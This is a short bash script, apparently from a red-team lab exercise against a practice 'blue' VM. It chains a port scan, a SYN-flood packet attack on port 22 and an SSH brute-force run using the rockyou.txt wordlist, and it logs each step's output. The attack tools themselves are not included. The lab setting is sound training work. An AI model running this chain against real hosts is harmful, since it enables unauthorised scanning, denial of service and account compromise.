#!/bin/bash
set -euo pipefail
ROOT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
ART_DIR="$ROOT_DIR/artifacts"
mkdir -p "$ART_DIR"

TARGET_IP="${TARGET_IP:-CHANGE_ME}"
SSH_USER="${SSH_USER:-admin}"
WORDLIST="${WORDLIST:-rockyou.txt}"

if [ "$TARGET_IP" = "CHANGE_ME" ]; then
  echo "[ERROR] Define TARGET_IP=IP_DE_TU_VM_BLUE antes de ejecutar."
  exit 1
fi

echo "[RED] Escaneo con scanner.py (si existe)"
if [ -f "$ROOT_DIR/scanner.py" ]; then
  # El script pide input interactivo, lo alimentamos con here-string
  python3 "$ROOT_DIR/scanner.py" <<< "$TARGET_IP" | tee "$ART_DIR/nmap_results_console.txt"
  # Copiar también cualquier reporte_scan_*.txt generado
  find "$ROOT_DIR" -maxdepth 1 -type f -name "reporte_scan_${TARGET_IP}_*.txt" -exec cp {} "$ART_DIR/" \; || true
else
  echo "[WARN] scanner.py no encontrado"
fi

echo "[RED] Enviando SYN falsos (packet_attack.py)"
if [ -f "$ROOT_DIR/packet_attack.py" ]; then
  # Opción 1 del menú (SYN falso) puerto 22 (modifica si quieres)
  { echo "1"; echo "$TARGET_IP"; echo "22"; } | python3 "$ROOT_DIR/packet_attack.py" | tee "$ART_DIR/syn_flood_console.txt"
else
  echo "[WARN] packet_attack.py no encontrado"
fi

echo "[RED] Ataque fuerza bruta controlado (ssh_brute.py)"
if [ -f "$ROOT_DIR/ssh_brute.py" ]; then
  # Exportar variables para que el script pueda leerlas si lo adaptas
  export HOST="$TARGET_IP"
  export USERNAME="$SSH_USER"
  export WORDLIST="$WORDLIST"
  python3 "$ROOT_DIR/ssh_brute.py" || true
  # Copiar log si existe
  [ -f "$ROOT_DIR/ssh_brute.log" ] && mv "$ROOT_DIR/ssh_brute.log" "$ART_DIR/ssh_brute.log"
else
  echo "[WARN] ssh_brute.py no encontrado"
fi

echo "[RED] Listo"
